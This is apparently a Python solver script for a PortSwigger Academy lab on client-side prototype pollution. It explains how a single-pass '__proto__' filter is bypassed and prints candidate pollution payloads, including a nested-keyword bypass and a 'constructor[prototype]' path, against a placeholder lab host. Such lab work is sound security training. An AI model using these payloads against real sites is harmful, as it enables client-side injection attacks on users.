"""
Lab 4: Client-side prototype pollution via flawed sanitization
https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-flawed-sanitization
Difficulty: Practitioner

📝 The app DOES attempt to strip __proto__ from input before merging —
but the filtering is incomplete. Classic incomplete-filter bypass: if it
only removes the string "__proto__" ONCE rather than looping until none
remain, wrapping it (__pro__proto__to__) leaves a valid __proto__ behind
after a single pass of removal.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("Looking for the sanitization step itself — a .replace('__proto__',")
    note("'') or similar single-pass removal is the thing to spot.")
    grep_for_patterns(source, ["__proto__", "replace", "sanitiz"])

    candidates = [
        "__proto__[test]=polluted",                    # baseline, likely blocked
        "__pro__proto__to__[test]=polluted",            # single-pass-removal bypass
        "constructor[prototype][test]=polluted",        # alternate path entirely
    ]

    note("Try each candidate — open in a real browser and check")
    note("Object.prototype.test afterward (fetch alone won't execute the")
    note("page's merge logic, since this is a client-side/DOM sink):")
    for c in candidates:
        print(f"  {TARGET}/?{c}")


if __name__ == "__main__":
    run()
